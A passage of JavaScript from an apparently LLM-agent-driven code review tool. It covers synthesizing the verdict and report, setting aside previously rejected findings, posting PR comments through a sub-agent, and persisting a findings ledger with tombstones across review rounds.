const thinned = results
  .flatMap(r => [...r['confirmed'], ...r['suspected'], ...(r['refuted'] || []), ...(r['unverified'] || [])])
  .filter(f => (f.votesDiscarded || 0) > 0).length
// `scopeNotRun` leads: a scope the caller asked for and did not get is the first thing a reader of
// the verdict needs, ahead of anything the run itself failed to finish.
const notRun = [...scopeNotRun, ...results.flatMap(r => r['notRun'])]
// Files no profile covered are a coverage hole, not a footnote — but they are NOT a `notRun` entry.
// `notRun` means "this ran badly; re-run it": every other entry is a failure a re-run can fix, and
// lib/analyze-runs.mjs ranks the list by EXACT STRING to surface repeated fragility. A note
// embedding a count and file names is unique per run, so it filled that ranking with count-1 rows
// and sank the genuinely repeated failures — while saying the opposite of what it means, since
// re-running will never review these files. The record carries them as `uncoveredFiles`; the
// reporting below draws the INCOMPLETE marker from `coverageNotes`, alongside `notRun`.
// Same reasoning as `uncoveredFiles` directly above, from the other direction: a deliberate saving
// is not a coverage hole either, so it joins neither `notRun` nor `coverageNotes` and never reaches
// `incompleteNotes`. It is counted across runs by lib/analyze-runs.mjs, under its own heading.
const savedByFloor = results.flatMap(r => r['savedByFloor'] || [])
const coverageNotes = uncoveredGap.length ? [uncoveredNotRunNote(uncoveredGap)] : []
const incompleteNotes = [...notRun, ...coverageNotes]
const criticNotes = results.map(r => r['criticNotes']).filter(n => n && n.trim() && n.trim() !== 'coverage complete').map(n => n.trim()).join(' · ')

// A re-review with adjudicated content (still-open/regressed/resolved/carried priors) must fall
// through to the full synthesis so the re-review report renders — a bare "Approve — no findings"
// here would wrongly erase still-open/regressed priors.
const hasAdjudicated = hasAdjudicatedTracks()
function hasAdjudicatedTracks() {
  return !!(adjudicated.stillOpen.length || adjudicated.regressed.length || adjudicated.resolved.length || adjudicated.carried.length || adjudicated.retired.length)
}
// `unverified` counts here too: they are real reported findings, and falling into the "nothing
// survived" branch would delete them from the report entirely.
// `priorTombstones.length` keeps this exit from silently dropping the recidivism memory: a clean
// re-review round that found nothing and adjudicated nothing must still fall through to the ledger
// step so earlier tombstones are carried forward, exactly as carried priors (which make
// `hasAdjudicated` true) already are — otherwise the memory evaporates on the first quiet round.
function nothingSurvived() {
  return !confirmed.length && !suspected.length && !unverified.length && !hasAdjudicated && !priorTombstones.length && !priorRejected.length
}
async function noFindingsExit() {
  // floorPremiseHeld is not yet known at this early exit (it is re-read after synthesis), so the
  // suffix here rests on notRun + coverageNotes alone: INCOMPLETE for a genuine not-run, PARTIAL
  // COVERAGE for a coverage hole a re-run will not fix.
  const earlySuffix = verdictSuffix({ notRun, coverageNotes })
  await logRun(reviewRecord({ verdict: `Approve${earlySuffix}`, round: thisRound, findings: summarizeFindings([]), dimensions: [], verification: { candidates: dropped, confirmed: 0, refuteRate: refuteRate(dropped, dropped) }, notRun }))
  const verdictLine = earlySuffix
    ? `⚠️ Approve${earlySuffix} — gate ${mergedGateStatus}; no findings survived, but ${incompleteNotes.join('; ')} — this verdict covers ONLY what ran. Files listed as matching no language profile are outside this engine (${supportedLangLabel(PROFILES)}) and re-running will not review them — review them by hand or with a tool that speaks their language${notRun.length ? '; anything else in the list is a failure to fix and re-run' : ''}.`
    : `✅ Approve — gate ${mergedGateStatus}; no findings across ${active.map(p => p.id).join('+')}.`
  // `scopeSection()` here too. The comment on its declaration promises it reaches "whichever report
  // is returned — every early exit included", and this exit was the one that did not: a run whose
  // requested scope was dropped and which then found nothing returned a report that never named the
  // path the caller asked for. The verdict line carries the CLASS (through `notRun`); only this
  // section carries the path, and a dropped scope matters most precisely when the answer is Approve.
  return out([`## Verdict`, verdictLine, ``, `## Gate`, mergedProvenance, carriedSection(),
    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
  ].join('\n') + scopeSection())
}
// ---- Prior decisions: set aside what the project already rejected, never silently ----
// A finding a recalled decision answers leaves the verdict and is listed under its own section with
// the decision's reason, author, date and link; it is persisted as `rejected`, so a re-review carries
// it like any other dismissal. It stays a finding when it is Critical/High or when its decision's
// scope cannot be shown unchanged since the recorded commit — one agent runs the `git diff --quiet`
// lines, and its death leaves every decision unconfirmed, so every such finding is raised again.
// On a re-review the decisions reach the still-open and regressed priors as well: a fresh duplicate
// of a live prior was absorbed into it (reconcileWithPriors), so the prior is where a rejected finding
// sits, and it counts in the verdict unless it is set aside there.
/** @type {Array<Finding & { priorTier: string, priorDecision: string }>} */
let priorRejected = []
// How many of `priorRejected` were live priors, not findings verified this round.
let priorRejectedLive = 0
async function setAsidePriorDecisions() {
  const live = adjudicated.stillOpen.length + adjudicated.regressed.length
  const r = await applyPriorDecisions({ confirmed, suspected, unverified, stillOpen: adjudicated.stillOpen, regressed: adjudicated.regressed }, priorDecisionsIn.decisions, toCheck => ragent(
    REPO_DIRECTIVE + scopeCheckPrompt(toCheck),
    { label: 'decision-scope', phase: 'Synthesize', schema: SCOPE_CHECK_SCHEMA, model: CULL_MODEL },
  ))
  confirmed = r.tiers['confirmed'] || []
  suspected = r.tiers['suspected'] || []
  unverified = r.tiers['unverified'] || []
  adjudicated.stillOpen = r.tiers['stillOpen'] || []
  adjudicated.regressed = r.tiers['regressed'] || []
  priorRejectedLive = live - adjudicated.stillOpen.length - adjudicated.regressed.length
  // A prior's ledger tier is its own; one that carries none is persisted as confirmed (it was adjudicated).
  priorRejected = r.setAside.map(f => /^(confirmed|suspected|unverified)$/.test(f.priorTier) ? f : { ...f, priorTier: 'confirmed' })
  for (const n of r.notes) log(`priorDecisions: ${n}`)
  // A decision whose commit this repo does not know is named with the refusals, apart from a changed scope.
  priorDecisionsIn.refused.push(...r.refused)
}
await setAsidePriorDecisions()
if (nothingSurvived()) return await noFindingsExit()

// ================= Synthesize one merged report =================
// ONE sentence, three readers: the first-pass template, the re-review template and the mechanical
// fallback report. It was written twice before and the two copies already meant different things.
// It names ALL FOUR ways into the tier — a Low/Info nobody paid a verifier for, a Medium nobody
// paid for because the verdict was already fixed at Block, a finding whose verifier died, and a
// panel whose every returned vote was off-schema — because a reader who is told only the cheap
// reasons will read a dead verifier's findings as cheap ones, and a panel that ANSWERED unreadably
// did not die: calling it a death misdescribes the largest discard there is.
const UNVERIFIED_PREAMBLE = 'These were not verified: no verifier was spent on them because a Low/Info finding cannot change the verdict, or because the verdict was already fixed at Block by a confirmed Critical/High and a Medium cannot move it, or the verifier that should have judged them died before returning a verdict, or every vote the panel DID return answered off-schema and carried none of the judgements the tier is decided on — each entry says which in its own `why`. Nothing below has been checked against the code — treat each as a lead, not a finding.'
phase('Synthesize')
const isRereview = !!priorRound
const rereviewData = rereviewDataOf()
function rereviewDataOf() {
  return isRereview ? {
    resolved: adjudicated.resolved, stillOpen: adjudicated.stillOpen,
    // `retired` is NOT folded into `carried`: they answer different questions for the reader. A
    // carried prior is re-checked next round; a retired one leaves the ledger, and on a full rescan
    // its re-discovery is kept as a New Confirmed finding — so folding them made the report say a
    // defect was "carried forward unchanged" while listing the same defect under New.
    regressed: adjudicated.regressed, carried: adjudicated.carried, retired: adjudicated.retired, neu: confirmed,
  } : null
}
// The verdict-line clause the synthesis model is told to append when coverage was not complete. It
// names the SAME cause the record string names: a genuine not-run is INCOMPLETE (re-running helps),
// a coverage hole is PARTIAL COVERAGE (a re-run will not fix it). floorPremiseHeld is deliberately
// not consulted here — the synthesis prompt is composed before the verdict exists, and the revoked-
// floor cause is appended afterward by markVerdictIncomplete.
const incompleteClause = incompleteClauseOf()
function incompleteClauseOf() {
  return incompleteNotes.length
    ? ` Append " · ⚠️ ${notRun.length ? 'INCOMPLETE — part of this review did not run' : 'PARTIAL COVERAGE — a coverage hole a re-run will not fix'}: ${incompleteNotes.join('; ')}; findings may be undercounted." to the verdict line.`
    : ''
}
// Set when the synthesis agent answered but not with report text, so the fallback names the real cause.
let synthesisUnusable = false
// The synthesis agent's report text, or null when it died or answered with something else (logged).
async function synthesize() {
  return ragent(
    `You are consolidating a code review (languages: ${active.map(p => p.id).join(', ')}) into ONE markdown report. Do NOT invent findings — only use what is given.

VERDICT RULE: the verdict is driven ONLY by Confirmed findings.
- ⛔ Block if any Confirmed Critical or High.
- ⚠️ Warning if Confirmed Medium only.
- ✅ Approve if no Confirmed Critical/High/Medium.
Suspected findings NEVER change the verdict — they are surfaced for the author. UNVERIFIED findings were never checked at all — EITHER no verifier was spent (a Low/Info cannot move the verdict) OR the verifier that should have judged them died before returning one OR every vote it did return was off-schema and unreadable, so a Critical or High can carry this tier. They change nothing and must never be presented as confirmed, as checked, or as cheap.${strict ? '\nSTRICT MODE: the maintainability bar is a presumption of block — if ANY Confirmed finding has source "maintainability" (or lists "maintainability" among its merged `sources`) at Medium or above, the verdict is ⛔ Block (state in the verdict line that strict maintainability mode escalated it).' : ''}

CALIBRATE severities across the Confirmed set so the same kind of issue is not Critical in one place and Medium in another; adjust outliers and say so in one line if you do. For any resource-exhaustion / algorithmic-complexity finding (SAF-009), severity must be MEASURED, not inherited from "same class as X" — a shared mechanism implies nothing about shared magnitude. Demand attack cost against a REAL-DATA baseline (not just the PoC's own numbers) and attacker-bytes-per-victim-CPU-second; where the finding carries no such measurement, say so and rate it conservatively rather than borrowing a neighbour's label.

DEDUPLICATE across lenses: findings that describe the same underlying defect (same file, same/overlapping lines, fixes that collapse into one edit) MUST be merged into ONE entry — keep the highest severity and the clearest why, credit the other lens in one clause. Never list per-lens duplicates as separate findings.

${isRereview ? `This is a RE-REVIEW (round ${thisRound}). Produce, in order:
1. \`## Verdict\` — driven ONLY by Still-open + Regressed + New Confirmed findings (Block on any Critical/High; Warning on Medium; else Approve). Resolved and Carried NEVER change the verdict.${incompleteClause}
2. \`## Gate\` — ${JSON.stringify(mergedProvenance)}.${carriedLine}
3. \`## ✅ Resolved\` — prior findings the fixes closed (one line each); omit if empty.
4. \`## 🔴 Still open\` — prior findings still present; \`severity · file:line · [ruleId] · what · why\`; omit if empty.
5. \`## ⚠️ Regressed\` — new defects the fixes introduced at a prior site; omit if empty.
6. \`## 🆕 New\` — Confirmed findings from the delta lenses (same format); omit if empty.
6b. \`## Unverified (not checked)\` — the UNVERIFIED JSON below, same format, and OPEN the section with exactly this sentence: "${UNVERIFIED_PREAMBLE}" Never merge these into New, Still open or Carried, never call them confirmed, and do not re-rank or upgrade their severity. They change nothing about the verdict. Omit the section if empty.
7. \`## 🔽 Carried\` — dismissed priors (rejected/justified) that are re-checked again next round, collapsed to a count + one-line list; omit if empty.
7b. \`## 🏁 Retired\` — dismissals whose code has not moved since the author ruled on them: they leave the ledger and are NOT re-checked again. Collapse to a count + one-line list; omit if empty. If a defect here also appears under \`## 🆕 New\`, say so on its line — the dismissal stopped being tracked and the site was raised afresh; that is expected, not a contradiction.${uncoveredFiles.length ? `\n8. \`## Not reviewed\` — these changed files match no active language profile and were NOT reviewed; list them verbatim: ${JSON.stringify(uncoveredFiles)}` : ''}${criticNotes ? `\n9. \`## Coverage gaps\` — surface verbatim: ${JSON.stringify(criticNotes)}` : ''}
RE-REVIEW DATA (JSON): ${JSON.stringify(rereviewData, null, 2)}` : `Produce, in order:
1. \`## Verdict\` — one line (emoji + reason).${incompleteClause}
2. \`## Gate\` — ${JSON.stringify(mergedProvenance)}.${carriedLine}
3. \`## Confirmed\` — findings by severity (Critical first), each as \`severity · file:line · [ruleId] · what · why · fix\` and a blast-radius note when present. Include the \`ruleId\` in brackets when the finding has a non-empty one; omit the brackets otherwise. When a finding carries a non-empty \`whereChecked\`, append \`· Premise checked at: <value>\` — that is the off-site evidence the author needs in order to re-check the claim, not decoration.
4. \`## Suspected (needs confirmation)\` — findings a verifier DID examine and could not confirm; same format; omit the section if empty.
5. \`## Unverified (not checked)\` — same format, and OPEN the section with exactly this sentence: "${UNVERIFIED_PREAMBLE}" Never merge these into Confirmed or Suspected, never call them confirmed, and do not re-rank or upgrade their severity. Omit the section if empty.
6. \`## Fix first\` — the few highest-leverage Confirmed items.
${uncoveredFiles.length ? `7. \`## Not reviewed\` — these changed files match no active language profile and were NOT reviewed; list them verbatim: ${JSON.stringify(uncoveredFiles)}` : ''}
${criticNotes ? `8. \`## Coverage gaps\` — surface verbatim: ${JSON.stringify(criticNotes)}` : ''}`}

CONFIRMED (JSON): ${JSON.stringify(confirmed, null, 2)}

SUSPECTED (JSON): ${JSON.stringify(suspected, null, 2)}

UNVERIFIED — NOT CHECKED (JSON): ${JSON.stringify(unverified, null, 2)}`,
    { label: 'synthesis', phase: 'Synthesize', effort: 'medium' },
  // Without a schema the answer is the agent's final text; anything else is no report at all — but a
  // LIVE agent that answered with a non-string, or with blank text, did not die, and the fallback must
  // not say it did: every non-null answer that reaches the fallback is an unusable one.
  ).then(text => {
    if (typeof text === 'string' && text.trim()) return text
    if (text != null) {
      synthesisUnusable = true
      const what = typeof text === 'string' ? 'blank text' : Array.isArray(text) ? 'an array' : `a value of type ${typeof text}`
      log(`⚠️ synthesis agent answered with ${what}, not report text — discarded; using the mechanical fallback report`)
    }
    return null
  })
}
const report = await synthesize()

// Optional: post Confirmed findings as inline PR comments (best-effort).
// Best-effort means it must not FAIL the run; it does not mean it may be INVISIBLE. The caller asked
// for comments, so whether they landed is part of the answer: the outcome is returned under a schema
// and logged, including "the agent died and we do not know". Discarding the return value made the
// prompt's own "report that" reach nobody.
async function postPrComments() {
  if (postComments && confirmed.length) {
    const posted = await ragent(
      `Post these Confirmed code-review findings as inline comments on the current branch's PR using \`gh\`. If gh is missing/unauthenticated or there is no PR, post nothing and say so in \`reason\` — never fail.
For each finding with a real file:line, add a review comment anchored to that file:line whose body is the finding's \`body\` VERBATIM — its first line and its last line (an HTML comment) are how a later session ties a reply to the finding. Findings:
${JSON.stringify(confirmed.map(f => ({ file: f.file, line: f.line, body: findingCommentBody(f) })), null, 2)}
Return {posted: <how many comments you actually created>, reason: <one line: the PR you posted to, or why nothing was posted>}.`,
      { label: 'pr-comments', phase: 'Synthesize', effort: 'low', schema: PR_COMMENTS_SCHEMA },
    )
    if (posted == null) log(`⚠️ PR comments: the poster agent returned nothing — ${confirmed.length} Confirmed finding(s) may or may not have been posted; check the PR`)
    else if (Number(posted.posted) > 0) log(`PR comments: posted ${Number(posted.posted)} of ${confirmed.length} Confirmed finding(s) — ${posted.reason || 'no detail'}`)
    else log(`⚠️ PR comments: nothing was posted (${confirmed.length} Confirmed finding(s) requested) — ${posted.reason || 'no reason given'}`)
  }
}
await postPrComments()

const allReviewFindings = confirmed.concat(suspected, unverified)
// The verification denominator: what verification ACTUALLY judged. `unverified` is deliberately
// absent — including it once made refuteRate incomparable across runs (on one measured run 118 of
// 215 findings were Low/Info, so the denominator was more than double the 89 verdicts really cast).
const totalVerified = confirmed.length + suspected.length + dropped + priorRejected.filter(f => f.priorTier !== 'unverified').length - priorRejectedLive
/** The verdict the record carries: the re-review tracks or the confirmed set, escalated by strict maintainability. */
function decideRecordVerdict() {
  let recordVerdict = isRereview
    ? rereviewVerdict({ stillOpen: adjudicated.stillOpen, regressed: adjudicated.regressed, neu: confirmed })
    : finalVerdict(confirmed)
  // Strict-mode maintainability escalation applies to a re-review too (finalVerdict already covers the
  // first-pass path): a Confirmed Medium+ maintainability finding among the live re-review set blocks.
  if (isRereview && strict && [...adjudicated.stillOpen, ...adjudicated.regressed, ...confirmed]
    .some(f => isMaintainability(f) && (f.severity === 'Critical' || f.severity === 'High' || f.severity === 'Medium'))) {
    recordVerdict = 'Block'
  }
  return recordVerdict
}
const recordVerdict = decideRecordVerdict()
// THE PREMISE OF THE SAVING, CHECKED AGAINST THE VERDICT THAT ACTUALLY CAME OUT. Skipping a Medium
// is legitimate only while "the verdict is already Block" stays true, and that is a claim about a
// moment, not an invariant: the floor is raised during Verify, and a confirmed finding can still
// leave the verdict afterwards — on a re-review `absorbAcross` folds it into a carried (dismissed)
// prior, and carried priors are deliberately excluded from `rereviewVerdict`. The Critical the
// saving rested on then vanishes from the verdict while the unverified Mediums remain unverified,
// and one of them could have been the difference between Approve and Warning.
// So the premise is RE-READ here rather than trusted: if the run did not end at Block, the skip was
// a genuine coverage hole after all, and it converts into exactly what a coverage hole is — a
// `notRun` entry, which a re-run can and should fix. This is the one case where the saving and the
// failure are the same event, told apart only by an outcome that is not known when the skip is made.
const floorPremiseHeld = !savedByFloor.length || recordVerdict === 'Block'
function reportRevokedPremise() {
  if (!floorPremiseHeld) {
    notRun.push(...savedByFloor.map(n => `${n} — AND THE PREMISE DID NOT HOLD: the run ended at ${recordVerdict}, not Block, so the saving rested on a confirmed finding that did not reach the verdict; re-run to check them`))
    log(`⚠️ ${savedByFloor.length} verification(s) were skipped because the verdict was already Block, but the run ended at ${recordVerdict} — the skipped findings are reported as a coverage hole, not as a saving`)
  }
}
reportRevokedPremise()
// Persist the ledger so round N+1 can find round N. On a re-review it grows by FOUR paths, not the
// three that are obvious: (1) the new delta findings; (2) still-open/regressed priors, as 'open';
// (3) dismissed priors still carried, with their disposition; and (4) — easy to miss because it
// enters through (1) — a NEW finding whose only carrier RETIRED this round. partitionAbsorbed keeps
// such a finding rather than absorbing it into a host that will not be persisted, so on a full
// re-scan a dismissal can retire and its own re-discovery re-enter the very same ledger as 'open',
// stripped of the author's disposition. That is deliberate and its cost is argued at the retirement
// comment above (losing a label beats losing a defect) — but it is a path, and an enumeration that
// omits it reads as a guarantee it does not make.
// `resolved` and `retired` priors do not re-enter as LIVE rows — they have been answered and cost no
// further adjudication — but neither do they vanish: each leaves a `disposition:'closed'` tombstone
// (below) so a later round can tell its return from a novelty. Without the carry-forward the ledger
// would otherwise hold only this round's delta, and a finding open across 3+ rounds — or a dismissed
// one — would silently vanish after one hop.
// TRACKED_MARK IS STRIPPED HERE, AND ONLY HERE. "this site is already tracked by a still-live prior
// finding" is a statement about THIS round, computed from this round's live priors. `why` is a
// persisted ledger field, so appending it made the sentence travel into round N+1 verbatim — where
// it became false the moment that prior resolved or retired, and nothing re-evaluated it. Stripping
// at the ledger door keeps the mark in the report, where it is true, and out of the record, where
// nothing can keep it true. Re-evaluating it instead was rejected: the mark is recomputed from
// scratch every round anyway (markTrackedUnverified), so a carried copy can only ever be a stale
// duplicate of a fresh computation.
/** @param {Finding} f @param {string | undefined} disposition @param {string} [tier] */
const toLedgerEntry = (f, disposition, tier) => ({
  ...ledgerLocation(f),
  severity: f['severity'], tier: tier || f['tier'] || 'suspected', disposition: disposition || f['disposition'] || 'open',
  source: f['source'] || '', ruleId: f['ruleId'] || '', title: f['title'] || '', why: String(f['why'] || '').split(TRACKED_MARK).join('').replace(THINNED_CLAUSE, ''),
  ...ledgerSources(f),
  ...ledgerWhyRef(f),
})
/** The leading fields of a ledger entry: its fingerprint and where it sits. @param {Finding} f */
function ledgerLocation(f) {
  return { fp: f['fp'] || fingerprint(f), file: f['file'] || '', line: f['line'] || 0, symbol: f['symbol'] || '' }
}
/** A ledger entry's `sources`, present only when the finding carries an array of them. @param {Finding} f */
function ledgerSources(f) {
  return Array.isArray(f['sources']) ? { sources: /** @type {unknown[]} */ (f['sources']) } : {}
}
/** @param {Finding} f */
function ledgerWhyRef(f) {
  // A CARRIED finding arrived from the prior-round transport with a SHORTENED `why` and a `whyRef`
  // pointing at the record its FULL `why` lives in (its birth). Persist that pointer so the short-why/
  // full-by-reference chain survives into the next round. A FRESH finding (born this round, straight
  // from a lens) has no `whyRef`: its full `why` is persisted here verbatim and NO pointer is written.
  return f['whyRef'] && typeof f['whyRef'].record === 'string' && typeof f['whyRef'].fp === 'string'
    ? { whyRef: { record: f['whyRef'].record, fp: f['whyRef'].fp } } : {}
}
// A tombstone for a resolved/retired prior: the same ledger shape, `disposition:'closed'`, but its
// `why` is a fixed ORIGIN+round marker rather than the original rationale — a tombstone's only job is
// an equality test (the recidivism check on load) plus telling a fixed defect that REGRESSED
// (`resolved`) from a dismissed one that was RE-RAISED (`dismissed`), so it carries the origin and
// the round it closed in, and no prose. The origin lives in `why` (not a new field) so it rides the
// existing ledger shape and the round-marker regex reads both forms unchanged.
// `fp` is RECOMPUTED under THIS round's basis, overriding the `f.fp || fingerprint(f)` toLedgerEntry
// would otherwise carry: a prior LIVE finding loaded from a ledger written under an earlier fingerprint
// basis still carries its stored old-basis `fp`, and if a tombstone minted from it kept that stale
// hash, a later same-basis round would key the recidivism check on the old basis (`t.fp`) while
// looking the returning defect up under the current one (`fingerprint(f)`) — the two never match and
// the regression is missed in silence, the exact class the fingerprint-basis guard removes, only shifted a round
// on. Minting every tombstone under the current basis closes it for BOTH paths (resolved and dismissed);
// an incomparable CARRIED tombstone is dropped at assembly below, never re-minted here.
const toTombstone = (/** @type {Finding} */ f, origin = 'resolved') => {
  // A tombstone's `why` is a fixed ORIGIN+round marker, not a shortened rationale, so it owes no
  // `whyRef` back-pointer — drop the one a carried source finding may bring in, keeping the row bare.
  const { whyRef: _whyRef, ...entry } = toLedgerEntry(f, 'closed', f['tier'])
  return { ...entry, fp: fingerprint(f), why: `${origin} in round ${thisRound}` }
}
// The tombstone set is bounded against the border that actually governs the persisted
// ledger: the single-call copy of the FINAL record refuses on the WHOLE ledger (~170 entries), live
// rows AND tombstones together — NOT on tombstones alone. So count the live rows this ledger will carry
// and hand pruneTombstones a `tombstoneBudget` that leaves room for them under that border. Without it
// the set grew monotonically — new tombstones plus every earlier one carried verbatim, a fresh same-fp
// row per recidivist cycle — and, sized against the far looser shard budget, could cross the copy-
// refusal border on tombstones-plus-live and invert the memory into a per-round full rescan. It is
// also DEDUPED by fingerprint (newest per fp); the read side above already tolerates a tombstone it no
// longer remembers (it treats the finding as novel), so the cap evicting the oldest rounds is safe.
const liveLedgerCount = confirmed.length + suspected.length +
  unverified.filter(f => !f.ledgerDupOfUnverifiedPrior).length +
  adjudicated.stillOpen.length + adjudicated.regressed.length + adjudicated.carried.length + priorRejected.length
const tombstones = assembleTombstones()
function assembleTombstones() {
  return pruneTombstones([
    ...adjudicated.resolved.map(f => toTombstone(f, 'resolved')),
    ...adjudicated.retired.map(f => toTombstone(f, 'dismissed')),
    // Carried tombstones from an incomparable fingerprint basis are dropped, not carried forward under a
    // stale basis: a clean baseline after a basis change (or a reported loss when the basis verdict did
    // not arrive). This round's own tombstones are minted under the current basis (toTombstone recomputes
    // `fp`, so even a prior loaded under an old basis gets a current-basis hash) and kept regardless.
    ...(priorFpComparable ? priorTombstones : []),
  ], { max: tombstoneBudget(liveLedgerCount) })
}
const reviewLedger = assembleLedger()
function assembleLedger() {
  return isRereview
    ? [
      ...confirmed.map(f => toLedgerEntry(f, 'open', 'confirmed')),
      ...suspected.map(f => toLedgerEntry(f, 'open', 'suspected')),
      // An unverified finding whose carrier is ITSELF an unverified prior writes no second row: see
      // `ledgerDupOfUnverifiedPrior` in lib/review-adjudicate.mjs for why that host and no other.
      ...unverified.filter(f => !f.ledgerDupOfUnverifiedPrior).map(f => toLedgerEntry(f, 'open', 'unverified')),
      ...adjudicated.stillOpen.map(f => toLedgerEntry(f, 'open')),
      ...adjudicated.regressed.map(f => toLedgerEntry(f, 'open')),
      // `adjudicated.resolved`/`adjudicated.retired` no longer leave the ledger silently: each becomes a
      // lightweight TOMBSTONE (`disposition:'closed'`) so a later round can tell the defect's RETURN
      // from a genuine novelty. It is not a live finding — the carve-out on load keeps it out of the
      // adjudicator — and it costs one bare row, not a re-adjudicated one. The set (this round's plus
      // the earlier ones carried forward) is deduped and capped above; each row keeps its own origin+
      // round marker, which is the round the REGRESSION / re-raised note reports.
      ...tombstones,
      ...adjudicated.carried.map(f => toLedgerEntry(f, f['disposition'])),
      ...priorRejected.map(f => toLedgerEntry(f, 'rejected', f.priorTier)),
    ]
    : allReviewFindings.map(f => toLedgerEntry(f, 'open', f.tier || 'suspected')).concat(priorRejected.map(f => toLedgerEntry(f, 'rejected', f.priorTier)))
}
// THE LEDGER IS PERSISTED BEFORE THE RECORD IS ATTEMPTED, in bounded shards, one small checkpoint
// per shard (lib/ledger-shards.mjs carries the measurement and the reasoning). The final record is
// written once, at the end, through a model copying the whole thing in one tool call — the step that
// lost three consecutive runs, the last of them a logger that REFUSED a ~170-entry ledger outright
// rather than risk truncating it. Checkpoints are the step that survived all three. So the ledger
// goes down that path first: if `logRun` below is lost, the next round still reads this round's
// findings out of `.partial` instead of starting over.
//
// Written HERE and not earlier because this is the first moment the ledger exists — it is the
// carry-forward, so it needs the adjudication of the prior round that only just finished.
async function persistLedgerShards() {
  for (const shard of shardLedger(reviewLedger)) {
    await checkpoint(`${LEDGER_SHARD_PHASE}-${String(shard.ledgerShard.index).padStart(2, '0')}`, { branch, head, ...shard }, 'Synthesize')
  }
}
await persistLedgerShards()
await logRun(reviewRecord({
  verdict: recordVerdict + verdictSuffix({ notRun, coverageNotes, floorPremiseHeld }),
  savedByFloor,
  // Recorded as its own field, not inferred from the two lists: "the saving was legitimate" and
  // "the saving turned into a hole" are the question any later count of this economy has to ask
  // first, and deriving it from string shapes would break the moment a string is reworded.
  savedByFloorPremiseHeld: floorPremiseHeld,
  round: thisRound,
  findings: summarizeFindings(allReviewFindings),
  ledger: reviewLedger,
  dimensions: results.flatMap(r => r['plan'].lenses.map((/** @type {string} */ l) => {
    const s = summarizeFindings(r['confirmed'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l))
    const confirmedCount = r['confirmed'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
    const suspectedCount = r['suspected'].filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
    const unverifiedCount = (r['unverified'] || []).filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
    const refutedCount = (r['refuted'] || []).filter((/** @type {Finding} */ f) => (f['source'] || '') === l).length
    // `ran` distinguishes "executed and found nothing" from "never returned". Both otherwise render
    // as a 0-finding row, and the yield analysis would read a broken lens as a redundant one.
    // Absent `ranLenses` (a record written before this landed) → assume it ran, the old behaviour.
    const ran = r.ranLenses ? r.ranLenses.includes(l) : true
    return { dimension: `${r.profile.id}:${l}`, ran, verdict: '', findingCount: s.total, bySeverity: s.bySeverity, confirmedCount, suspectedCount, refutedCount, unverifiedCount }
  })),
  verification: { candidates: totalVerified, confirmed: confirmed.length, refuteRate: refuteRate(dropped, totalVerified), unverified: unverified.length, thinned },
  notRun,
}))

// If the synthesis agent died even after the retry, don't lose the whole run — assemble a
// mechanical report from the verified findings (unmerged, but complete).
function fallbackReport() {
  // Why there is no synthesized report: a death and a live answer that was not report text read differently.
  const cause = synthesisUnusable ? 'synthesis agent returned no usable report' : 'synthesis agent died twice'
  // On a re-review the verdict must come from recordVerdict (still-open+regressed+new), NOT
  // finalVerdict(confirmed) — confirmed holds only the delta, so finalVerdict would print a false
  // Approve and hide live still-open/regressed priors. Render those tracks too.
  const emoji = { Block: '⛔ Block', Warning: '⚠️ Warning', Approve: '✅ Approve' }[isRereview ? recordVerdict : finalVerdict(confirmed)]
  const fmt = (/** @type {Finding} */ f) => `- ${f['severity']} · \`${f['file'] || '?'}:${f['line'] || 0}\`${f['ruleId'] ? ` · [${f['ruleId']}]` : ''} · ${f['title']} · ${f['why']} · Fix: ${f['fix']}${f['whereChecked'] ? ` · Premise checked at: ${f['whereChecked']}` : ''}`
  const bySev = (/** @type {Finding[]} */ a) => a.slice().sort((/** @type {Finding} */ x, /** @type {Finding} */ y) => (SEV_RANK[x['severity'] ?? ''] ?? 9) - (SEV_RANK[y['severity'] ?? ''] ?? 9))
  return [
    `## Verdict`,
    // `notRun` LIVE, not the `incompleteNotes` snapshot taken before the verdict existed: the
    // revoked-premise path pushes into `notRun` afterwards, and a fallback rendered from the stale
    // snapshot would print a clean verdict over findings the same run has just declared unchecked.
    `${emoji} — ${cause}; mechanical fallback report (findings listed unmerged).${fallbackIncompleteClause()}`,
    ``, `## Gate`, mergedProvenance, carriedSection(),
    ...fallbackRereviewTracks(bySev, fmt),
    ``, `## ${isRereview ? '🆕 New' : 'Confirmed'}`, ...(confirmed.length ? bySev(confirmed).map(fmt) : ['- none']),
    ...(suspected.length ? [``, `## Suspected (needs confirmation)`, ...bySev(suspected).map(fmt)] : []),
    ...(unverified.length ? [``, `## Unverified (not checked)`, UNVERIFIED_PREAMBLE, ...bySev(unverified).map(fmt)] : []),
    ...(uncoveredFiles.length ? [``, `## Not reviewed (no language profile)`, ...uncoveredFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
  ].join('\n')
}

/** The fallback verdict line's incompleteness clause, read from the live `notRun`. */
function fallbackIncompleteClause() {
  return [...notRun, ...coverageNotes].length ? ` · ⚠️ ${notRun.length ? 'INCOMPLETE — part of this review did not run' : 'PARTIAL COVERAGE — a coverage hole a re-run will not fix'}: ${[...notRun, ...coverageNotes].join('; ')}.` : ''
}

/** A re-review's still-open and regressed tracks in the fallback report. @param {(a: Finding[]) => Finding[]} bySev @param {(f: Finding) => string} fmt @returns {string[]} */
function fallbackRereviewTracks(bySev, fmt) {
  return [
    ...(isRereview && adjudicated.stillOpen.length ? [``, `## 🔴 Still open`, ...bySev(adjudicated.stillOpen).map(fmt)] : []),
    ...(isRereview && adjudicated.regressed.length ? [``, `## ⚠️ Regressed`, ...bySev(adjudicated.regressed).map(fmt)] : []),
  ]
}

// APPENDED AFTER SYNTHESIS, because the synthesis prompt is composed before the verdict exists and
// therefore cannot carry this. The model wrote its report believing the run was a Block; if it was
// not, the reader is told here, in the report itself, rather than only on the run record.
// THE VERDICT LINE ITSELF, not only a section under it. The synthesis prompt was composed before
// the verdict existed, so the model wrote its `## Verdict` line believing the run was a Block — and
// a reader who has read a green verdict line has been misled, whatever a section at the bottom of
// the document says afterwards. The run record already says INCOMPLETE here, so without this the
// record and the report disagree, and rust-audit's dimension roll-up reads the verdict STRING: a
// clean line there carries the wrong-green up into the audit.
// Amends the first non-empty line under `## Verdict`, and only if it does not already say so.
/** @param {string} text */
